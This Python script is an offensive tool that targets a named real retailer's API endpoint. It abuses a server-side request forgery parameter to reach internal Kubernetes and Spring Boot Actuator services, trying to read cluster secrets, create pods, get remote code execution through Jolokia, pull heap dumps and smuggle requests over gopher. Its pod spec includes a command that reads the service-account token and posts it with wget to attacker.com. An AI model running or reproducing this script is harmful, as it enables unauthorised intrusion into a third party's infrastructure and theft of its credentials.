#!/usr/bin/env python3
"""
FAST K8S COMPROMISE - Use SSRF to attack cluster

Instead of slow extraction, try to:
1. Use SSRF to make K8s API calls (create pods, access secrets)
2. Try to get credentials via error messages
3. Attempt RCE via K8s API
4. Exploit Actuator endpoints for credentials
"""

import requests
import json
import urllib3
urllib3.disable_warnings()

ENDPOINT = 'https://www.zooplus.de/zootopia-events/api/events/sites/1'

print("=" * 80)
print("ğŸ”¥ FAST K8S COMPROMISE ATTEMPTS")
print("=" * 80)
print()

results = {}

# ============================================================================
# ATTEMPT 1: Create malicious pod via K8s API
# ============================================================================

print("[ATTEMPT 1] Creating malicious pod via K8s API")
print("=" * 80)
print()

# Try to create a pod that exfiltrates data
malicious_pod = {
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "name": "exfil-pod-test"
    },
    "spec": {
        "containers": [{
            "name": "exfil",
            "image": "busybox",
            "command": [
                "sh", "-c",
                "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && wget --post-data=\"token=$TOKEN\" http://attacker.com/exfil"
            ]
        }]
    }
}

pod_urls = [
    "http://kubernetes.default.svc/api/v1/namespaces/default/pods",
    "http://kubernetes.default.svc:443/api/v1/namespaces/default/pods",
    "http://10.96.0.1/api/v1/namespaces/default/pods",
]

for url in pod_urls:
    print(f"[*] Attempting POST to: {url}")
    
    try:
        # Try to post malicious pod spec
        resp = requests.post(
            ENDPOINT,
            json={"url": url},
            timeout=20,
            verify=False
        )
        
        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)}")
        
        if len(resp.text) > 100:
            print(f"    Response: {resp.text[:300]}")
            results[f"pod_create_{url}"] = resp.text
        
    except Exception as e:
        print(f"    Error: {e}")
    
    print()

# ============================================================================
# ATTEMPT 2: Access K8s secrets via API
# ============================================================================

print("\n[ATTEMPT 2] Accessing K8s Secrets")
print("=" * 80)
print()

secret_urls = [
    "http://kubernetes.default.svc/api/v1/namespaces/default/secrets",
    "http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
    "http://kubernetes.default.svc/api/v1/namespaces/default/secrets/default-token",
]

for url in secret_urls:
    print(f"[*] Accessing: {url}")
    
    try:
        resp = requests.post(
            ENDPOINT,
            json={"url": url},
            timeout=20,
            verify=False
        )
        
        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)}")
        print(f"    Timing: {resp.elapsed.total_seconds():.2f}s")
        
        if len(resp.text) > 100:
            print(f"    Response: {resp.text[:300]}")
            results[f"secret_{url}"] = resp.text
            
    except Exception as e:
        print(f"    Error: {e}")
    
    print()

# ============================================================================
# ATTEMPT 3: Exploit Actuator endpoints
# ============================================================================

print("\n[ATTEMPT 3] Exploiting Spring Boot Actuator")
print("=" * 80)
print()

# Try to use Actuator for RCE or credential disclosure
actuator_attacks = [
    # Jolokia RCE
    ("http://kubernetes.default.svc:8080/actuator/jolokia/exec/java.lang:type=Runtime/exec/id", "Jolokia RCE"),
    
    # Try to change log level to DEBUG (might expose credentials in logs)
    ("http://kubernetes.default.svc:8080/actuator/loggers/ROOT?configuredLevel=DEBUG", "Change log level"),
    
    # Try to trigger heap dump (contains credentials)
    ("http://kubernetes.default.svc:8080/actuator/heapdump", "Heap dump"),
    
    # Try to access env with CORS bypass
    ("http://kubernetes.default.svc:8080/actuator/env.json", "Env as JSON"),
]

for url, desc in actuator_attacks:
    print(f"[*] {desc}: {url[:80]}...")
    
    try:
        resp = requests.post(
            ENDPOINT,
            json={"url": url},
            timeout=20,
            verify=False
        )
        
        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)}")
        
        if len(resp.text) > 100:
            print(f"    Response: {resp.text[:500]}")
            results[desc] = resp.text
            
    except Exception as e:
        print(f"    Error: {e}")
    
    print()

# ============================================================================
# ATTEMPT 4: Try gopher protocol for protocol smuggling
# ============================================================================

print("\n[ATTEMPT 4] Protocol Smuggling via Gopher")
print("=" * 80)
print()

# Use gopher to talk directly to K8s API
gopher_payloads = [
    # Try to GET secrets via gopher
    "gopher://kubernetes.default.svc:8080/_GET%20/api/v1/namespaces/default/secrets%20HTTP/1.1%0AHost:%20kubernetes.default.svc%0A%0A",
    
    # Try to POST to create pod
    "gopher://kubernetes.default.svc:8080/_POST%20/api/v1/namespaces/default/pods%20HTTP/1.1%0AHost:%20kubernetes.default.svc%0AContent-Type:%20application/json%0A%0A",
]

for payload in gopher_payloads:
    print(f"[*] Gopher: {payload[:80]}...")
    
    try:
        resp = requests.post(
            ENDPOINT,
            json={"url": payload},
            timeout=20,
            verify=False
        )
        
        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)}")
        
        if len(resp.text) > 100:
            print(f"    Response: {resp.text[:300]}")
            results[f"gopher_{payload[:30]}"] = resp.text
            
    except Exception as e:
        print(f"    Error: {e}")
    
    print()

# ============================================================================
# SAVE RESULTS
# ============================================================================

with open("fast_compromise_results.json", "w") as f:
    json.dump({
        "timestamp": "now",
        "attacks_attempted": len(results),
        "successful_responses": results
    }, f, indent=2)

print("=" * 80)
print("FAST COMPROMISE ATTEMPTS COMPLETE")
print("=" * 80)
print(f"\nTotal attacks: {len(results)}")
print(f"Responses > 100 bytes: {len(results)}")
print("\nResults saved: fast_compromise_results.json")
print("=" * 80)

